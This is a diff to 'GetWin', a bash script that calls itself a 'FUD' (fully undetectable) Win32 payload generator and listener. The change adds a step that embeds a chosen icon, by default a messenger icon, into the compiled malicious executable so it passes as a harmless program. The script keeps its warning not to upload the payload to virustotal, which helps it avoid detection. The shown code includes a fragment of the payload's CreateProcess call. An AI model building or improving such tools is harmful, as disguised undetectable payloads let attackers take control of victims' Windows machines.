@@ -1,5 +1,5 @@
 #!/bin/bash
-# GetWin v1.1
+# GetWin v1.2
 # FUD Payload Generator and Listener
 # Coded by @thelinuxchoice
 # Github: https://github.com/thelinuxchoice/getwin
@@ -14,7 +14,7 @@ printf "    \e[1;31m(_______)\e[0m          _   \e[1;31m(_)\e[0m\e[1;32m(_)\e[0m
 printf "    \e[1;77m _   ___  _____  _| |_  _  _  _  _  ____   \n"
 printf "    | | (_  || ___ |(_   _)| || || || ||  _ \  \n"
 printf "    | |___) || ____|  | |_ | || || || || | | | \n"
-printf "     \_____/ |_____)   \__) \_____/ |_||_| |_|v1.1 \e[0m\n"
+printf "     \_____/ |_____)   \__) \_____/ |_||_| |_|v1.2 \e[0m\n"
                                           
 printf "\n"
 printf "\e[1;77m.:.:\e[0m\e[1;93m FUD win32 payload generator and listener \e[0m\e[1;77m:.:.\e[0m\n"                              
@@ -71,10 +71,32 @@ printf "\e[1;93m[!] Error...\e[0m\n"
 exit 1
 else
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Compiling... \e[0m\n"
-i686-w64-mingw32-g++ -o $payload_name.exe program.cpp -lws2_32
+i686-w64-mingw32-windres icon.rc -O coff -o my.res
+i686-w64-mingw32-g++ -o $payload_name.exe program.cpp my.res -lws2_32
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s.exe\n" $payload_name
 printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, don't upload to virustotal.com !\e[0m\n"
 rm -rf program.cpp
+rm -rf icon.rc
+rm -rf my.res
+fi
+
+}
+
+icon() {
+
+default_payload_icon="icon/messenger.ico"
+printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Put ICON path (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_icon
+read payload_icon
+payload_icon="${payload_icon:-${default_payload_icon}}"
+
+if [[ ! -e $payload_icon ]]; then
+printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] File not Found! Try Again! \e[0m\n'
+icon
+else
+if [[ $payload_icon != *.ico ]]; then
+printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, use *.ico file format. Try Again! \e[0m\n'
+icon
+fi
 fi
 
 }
@@ -91,6 +113,7 @@ default_payload_name="payload"
 printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
 read payload_name
 payload_name="${payload_name:-${default_payload_name}}"
+icon
 payload
 compile
 server
@@ -168,6 +191,7 @@ printf ' CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL,NULL, &sui, 
 printf '}\n' >> program.cpp
 
 generatePadding
+printf "id ICON \"%s\"" $payload_icon  > icon.rc
 }
 banner
 dependencies
